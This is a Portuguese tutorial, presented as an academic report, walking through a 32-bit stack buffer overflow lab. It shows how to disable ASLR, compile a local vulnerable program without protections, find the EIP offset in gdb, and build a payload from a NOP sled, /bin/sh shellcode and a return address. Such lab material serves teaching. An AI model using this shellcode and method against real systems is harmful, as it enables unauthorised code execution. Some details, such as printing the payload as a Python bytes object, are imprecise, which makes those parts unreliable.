# Preparação do Ambiente

Desativar o ASLR (Randomização de Memória): No terminal do Linux, execute:

`echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

Compilação Especial: Precisamos de flags específicas para desativar as defesas do compilador:

`gcc -fno-stack-protector -z execstack -m32 vulnerable.c -o vulnerable`

## Passo 1: Encontrar o Ponto de Quebra

Você precisa saber quantos caracteres são necessários para sobrescrever o EIP (o ponteiro que diz ao processador qual a próxima instrução a executar).

Abra o depurador: gdb ./vulnerable

`gdb ./vulnerable`

Dentro do GDB, tente rodar com uma entrada grande:

`run <<< $(python3 -c "print('A' * 20)")`

Se o GDB retornar Segmentation fault em um endereço como 0x41414141, Você sobrescreveu o fluxo de execução com "AAAA".

## Passo 2: Criar o Exploit (Python)

Use um script para automatizar a criação da "carga maliciosa" (payload). O objetivo é injetar um Shellcode (código que abre o terminal).

Shellcode para abrir /bin/sh (32-bit Linux):

`shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`

OP Sled (instruções 'No Operation' para dar margem de erro)

`nops = b"\x90" * 30`

Preenchimento para chegar até o endereço de retorno

`padding = b"A" * 15`

O endereço de retorno (onde o NOP sled começa na memória)

`eip = b"\x40\xd5\xff\xff"`

`payload = nops + shellcode + padding + eip`

`print(payload)`

---

Documento gerado para fins de relatório acadêmico de Análise de Vulnerabilidades / Cibersegurança.

